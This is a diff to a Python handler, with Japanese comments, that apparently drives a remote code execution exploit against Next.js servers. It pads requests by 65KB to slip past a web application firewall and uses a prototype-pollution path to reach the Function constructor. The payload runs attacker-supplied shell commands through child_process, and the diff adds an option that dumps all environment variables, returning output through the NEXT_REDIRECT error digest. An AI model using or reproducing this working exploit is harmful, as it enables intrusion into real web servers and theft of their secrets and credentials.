@@ -85,6 +85,7 @@ async def execute_command(body: dict):
     # ターゲットURLと実行コマンドを設定
     base_url = body.get("url")
     executable_command = body.get("command")
+    getenv = body.get("getenv", False)
 
     # ----------------------------------------------------
     # WAF回避のための設定
@@ -97,6 +98,11 @@ async def execute_command(body: dict):
     # これにより実際の攻撃ペイロードはWAFの検査範囲の外に配置される。
     padding_size = 65 * 1024  # 65KB
     padding_data = "A" * padding_size
+
+    if getenv:
+        payload = "var env_data = JSON.stringify(process.env); throw Object.assign(new Error('NEXT_REDIRECT'), {digest: env_data});"
+    else:
+        payload = f"var res = process.mainModule.require('child_process').execSync('{executable_command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
 
     # ----------------------------------------------------
     # チャンク 0: 悪意のあるフェイクチャンクの定義 (RCEペイロード)
@@ -117,7 +123,7 @@ async def execute_command(body: dict):
             # Next.jsにおいてエラーハンドリング時にそのままレスポンスに含まれることがあり、
             # その振る舞いが攻撃者に悪用されやすいためである。
             # またNEXT_REDIRECTはNext.jsにおいて特別な内部エラーとして処理される。攻撃者はこの振る舞いも利用している。
-            "_prefix": f"var res = process.mainModule.require('child_process').execSync('{executable_command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
+            "_prefix": payload,
             # Functionコンストラクタを取得するプロトタイプ汚染パス
             "_formData": {
                 "get": "$1:constructor:constructor",
